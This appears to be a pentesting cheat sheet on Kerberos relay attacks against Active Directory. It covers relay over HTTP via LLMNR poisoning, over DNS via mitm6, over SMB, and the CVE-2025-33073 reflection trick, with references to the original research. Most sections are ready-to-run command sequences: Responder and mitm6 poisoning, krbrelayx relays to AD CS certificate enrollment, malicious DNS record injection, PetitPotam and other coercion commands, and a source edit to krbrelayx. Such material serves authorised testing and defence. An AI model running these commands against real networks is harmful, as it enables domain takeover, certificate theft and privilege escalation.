# Internal - Kerberos Relay

## Kerberos Relay over HTTP

**Requirements**:

* Kerberos authentication for services without signing

HTTP through multicast poisoning (LLMNR)

* An attacker sets up an LLMNR poisoner on the multicast range.
* An HTTP client on the multicast range fails to resolve a hostname. This can happen because of a typo in a browser, a misconfiguration, but this can also be triggered by an attacker via WebDav coercion.
* The LLMNR poisoner indicates that the hostname resolves to the attacker’s machine. In the LLMNR response, the answer name differs from the query and corresponds to an arbitrary relay target.
* The victim performs a request on the attacker web server, which requires Kerberos authentication.
* The victim asks for a ST with the SPN of the relay target. It then sends the resulting AP-REQ to the attacker web server.
* The attacker extracts the AP-REQ and relays it to a service of the relay target.

**Example**: ESC8 with Kerberos Relay

```ps1
python3 Responder.py -I eth0 -N <PKI_SERVER>
sudo python3 krbrelayx.py --target 'http://<PKI_SERVER>.<DOMAIN.LOCAL>/certsrv/' -ip <ATTACKER_IP> --adcs --template User -debug
```

## Kerberos Relay over DNS

Abuses the DNS Secure Dynamic Updates in Active Directory.

* [dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)
* [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

```ps1
# Example - Relay to ADCS
sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine
sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz internal.corp/icorp-w10$ icorp-w10.ccache
```

## Kerberos Relay over SMB

Abuses the way SMB clients construct SPNs when asking for a ST.

* [cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay) - Framework for Kerberos relaying.
* [decoder-it/KrbRelayEx-RPC](https://github.com/decoder-it/KrbRelayEx-RPC) - Kerberos Relay and Forwarder for (Fake) RPC/DCOM MiTM Server.

```ps1
dnstool.py -u "DOMAIN.LOCAL\\user" -p "pass" -r "pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp
petitpotam.py -u 'user' -p 'pass' -d DOMAIN.LOCAL 'pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc.domain.local
krbrelayx.py -t 'http://pki.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC$'
gettgtpkinit.py -cert-pfx 'DC$.pfx' 'DOMAIN.LOCAL/DC$' DC.ccache
```

## Kerberos Reflection - CVE-2025-33073

Relay one machine to itself by using the `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` trick. Also, grants local admin privilege.

![reflective-kerberos-relay-attack](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/ReflectiveKerberosRelayAttackBlog_hu_4f4898429389ef25.webp)

* Add a DNS record for `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` pointing to our IP address. It is also possible to compromise any vulnerable machine by registering `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`.

    ```ps1
    dnstool.py -u 'domain.local\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 198.51.100.27
    # OR
    pretender -i "vmnet2" --spoof "target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" --no-dhcp --no-timestamps
    ```

* Edit `krbrelayx/lib/servers/smbrelayserver.py` and remove these lines

    ```ps1
    156: blob['tokenOid'] = '1.3.6.1.5.5.2'
    157: blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
    158:                                                MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
    159:                                                MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
    ```

* Start the relay to catch the callback from TARGET.

    ```ps1
    krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
    krbrelayx.py --target smb://target.lab.redteam -c whoam
    ```

* Trigger a callback from the server to `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` using PetitPotam.

    ```ps1
    nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
    # OR
    petitpotam.py -d domain.local -u username -p 'password' "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
    # OR
    wspcoerce 'lab.redteam/user:password@target.lab.redteam' file:////target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
    ```

## References

* [A Look in the Mirror - The Reflective Kerberos Relay Attack - RedTeam Pentesting - June 11, 2025](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)
* [Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx - Quentin Roland - January 27, 2025](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)
* [From NTLM relay to Kerberos relay: Everything you need to know - Decoder - April 24, 2025](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)
* [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073 - Wilfried Bécard and Guillaume André - June 11, 2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
* [Relaying Kerberos over DNS using krbrelayx and mitm6 - Dirk-jan Mollema - February 22, 2022](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
* [Relaying Kerberos over SMB using krbrelayx - Hugo Vincent - November 20, 2024](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx)
* [Using Kerberos for Authentication Relay Attacks - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
* [Windows Exploitation Tricks: Relaying DCOM Authentication - James Forshaw - October 20, 2021](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)
